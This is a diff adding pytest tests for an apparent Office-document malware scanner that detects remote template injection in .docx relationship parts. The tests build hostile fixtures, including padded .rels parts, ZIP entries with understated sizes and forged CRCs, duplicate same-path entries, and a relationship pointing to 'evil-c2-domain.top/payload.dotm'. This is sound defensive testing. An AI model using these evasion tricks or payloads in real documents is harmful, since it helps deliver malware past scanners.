@@ -91,6 +91,168 @@ def test_both_quote_styles_agree(tmp_path):
     assert double["external_relationships"] == single["external_relationships"]
 
 
+def test_oversize_rels_part_is_flagged_rather_than_skipped_silently(tmp_path):
+    """A .rels part is structurally tiny; a padded one is deliberate.
+
+    The scan skips parts over the size cap, which is the right call — but
+    it used to do so with no flag and no log line, so padding a .rels past
+    the cap removed template-injection detection entirely and the report
+    said nothing at all. The part is still not parsed; the padding itself
+    is now the finding.
+    """
+    padding = "<!-- " + "A" * (600 * 1024) + " -->"
+    out = analyse_openxml_rels(_docx(tmp_path, padding + _RELS.format(q='"')))
+    assert "rels_oversize" in out["indicator_flags"]
+    # Convicting, not merely noted: skipping the part is the whole point of
+    # the padding, so the padding has to cost more than what it hides.
+    assert score_document(out["indicator_flags"])[2] == "MALICIOUS"
+
+
+def test_understated_header_size_does_not_hide_a_rels_part(tmp_path):
+    """The declared size is attacker-controlled; the read is the real bound.
+
+    A central-directory entry can claim a small size for a part that is
+    actually large. Python's zipfile stops at the declared length and
+    raises on the CRC mismatch, so the part used to be skipped by a bare
+    `except: continue` — no flag, no log line. It is now reported for what
+    it is: the declared view and the real stream disagree, and the stream
+    is past the parse cap.
+    """
+    import struct
+
+    p = tmp_path / "spoof.docx"
+    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("[Content_Types].xml", "<Types/>")
+        z.writestr("word/_rels/document.xml.rels", "<!-- " + "A" * (2 << 20) + " -->")
+
+    raw = bytearray(p.read_bytes())
+    i = raw.find(b"PK\x01\x02")
+    while i != -1:
+        name_len = struct.unpack("<H", raw[i + 28:i + 30])[0]
+        if bytes(raw[i + 46:i + 46 + name_len]).endswith(b".rels"):
+            raw[i + 24:i + 28] = struct.pack("<I", 100)  # understate the size
+            break
+        i = raw.find(b"PK\x01\x02", i + 1)
+    p.write_bytes(bytes(raw))
+
+    out = analyse_openxml_rels(p)
+    assert "rels_size_mismatch" in out["indicator_flags"]
+    assert "rels_oversize" in out["indicator_flags"]
+    assert score_document(out["indicator_flags"])[0] > 0
+
+
+def test_truncated_declared_size_with_forged_crc_is_caught(tmp_path):
+    """The polite read and the real stream must agree, or it is a finding.
+
+    An attacker can understate a part's uncompressed size *and* forge the
+    CRC over that prefix. zipfile then returns the short prefix with no
+    error, so a scanner sees a harmless fragment while a consumer that
+    decompresses to the end of the deflate stream sees the whole
+    relationship. The two views are compared rather than trusted.
+    """
+    import struct
+    import zlib
+
+    payload = (
+        b"<Relationships><Relationship Id='rId1' "
+        b"Type='http://schemas.openxmlformats.org/officeDocument/2006/"
+        b"relationships/attachedTemplate' "
+        b"Target='http://evil-c2-domain.top/payload.dotm' "
+        b"TargetMode='External'/></Relationships>"
+    )
+    p = tmp_path / "differential.docx"
+    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("[Content_Types].xml", "<Types/>")
+        z.writestr("word/_rels/document.xml.rels", payload)
+
+    raw = bytearray(p.read_bytes())
+    i = raw.find(b"PK\x01\x02")
+    while i != -1:
+        name_len = struct.unpack("<H", raw[i + 28:i + 30])[0]
+        if bytes(raw[i + 46:i + 46 + name_len]).endswith(b".rels"):
+            raw[i + 24:i + 28] = struct.pack("<I", 20)          # understate
+            raw[i + 16:i + 20] = struct.pack(                    # forge CRC
+                "<I", zlib.crc32(payload[:20]) & 0xFFFFFFFF)
+            break
+        i = raw.find(b"PK\x01\x02", i + 1)
+    p.write_bytes(bytes(raw))
+
+    out = analyse_openxml_rels(p)
+    assert "rels_size_mismatch" in out["indicator_flags"]
+    # And the hidden relationship is still analysed, not merely reported.
+    assert "template_inject_non_ms" in out["indicator_flags"]
+
+
+def test_truncated_declared_size_with_the_real_crc_is_caught(tmp_path):
+    """The variant a working attack actually needs.
+
+    Forging the CRC over the prefix keeps the polite read quiet but leaves
+    a stream no CRC-checking consumer accepts. Keeping the *real* CRC is
+    what an attacker does instead: zipfile then raises on the short read.
+    If that failure ended the attempt, the hidden relationship would never
+    be looked at — so the probe runs regardless of it.
+    """
+    import struct
+
+    payload = (
+        b"<Relationships><Relationship Id='rId1' "
+        b"Type='http://schemas.openxmlformats.org/officeDocument/2006/"
+        b"relationships/attachedTemplate' "
+        b"Target='http://evil-c2-domain.top/payload.dotm' "
+        b"TargetMode='External'/></Relationships>"
+    )
+    p = tmp_path / "real_crc.docx"
+    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("[Content_Types].xml", "<Types/>")
+        z.writestr("word/_rels/document.xml.rels", payload)
+
+    raw = bytearray(p.read_bytes())
+    i = raw.find(b"PK\x01\x02")
+    while i != -1:
+        name_len = struct.unpack("<H", raw[i + 28:i + 30])[0]
+        if bytes(raw[i + 46:i + 46 + name_len]).endswith(b".rels"):
+            raw[i + 24:i + 28] = struct.pack("<I", 20)  # understate, keep CRC
+            break
+        i = raw.find(b"PK\x01\x02", i + 1)
+    p.write_bytes(bytes(raw))
+
+    out = analyse_openxml_rels(p)
+    assert "rels_size_mismatch" in out["indicator_flags"]
+    assert "template_inject_non_ms" in out["indicator_flags"]
+
+
+def test_an_honest_container_reports_no_size_mismatch(tmp_path):
+    out = analyse_openxml_rels(_docx(tmp_path, _RELS.format(q='"')))
+    assert "rels_size_mismatch" not in out["indicator_flags"]
+
+
+def test_duplicate_named_rels_parts_are_both_read(tmp_path):
+    """A ZIP may hold two entries at one path; a name lookup sees one.
+
+    Pairing a malicious .rels with a benign one at the same path made the
+    benign copy get read twice, because zf.open(name) resolves through
+    zipfile's name dictionary — which holds whichever entry came *last* —
+    rather than using the entry being iterated. The malicious part is
+    written first here for exactly that reason; reversing the order hides
+    the defect, since the lookup would then land on it by luck.
+    """
+    p = tmp_path / "dupe.docx"
+    with zipfile.ZipFile(p, "w") as z:
+        z.writestr("[Content_Types].xml", "<Types/>")
+        z.writestr("word/_rels/document.xml.rels", _RELS.format(q='"'))
+        z.writestr("word/_rels/document.xml.rels",
+                   '<Relationships><Relationship Id="rId1" Type="benign" '
+                   'Target="styles.xml"/></Relationships>')
+
+    out = analyse_openxml_rels(p)
+    assert "template_inject_non_ms" in out["indicator_flags"]
+
+
+def test_normal_rels_part_is_not_flagged_oversize(tmp_path):
+    out = analyse_openxml_rels(_docx(tmp_path, _RELS.format(q='"')))
+    assert "rels_oversize" not in out["indicator_flags"]
+
+
 def test_microsoft_hosted_template_is_not_flagged_as_external_host(tmp_path):
     rels = _RELS.format(q='"').replace(
         "http://evil-c2-domain.top/payload.dotm",
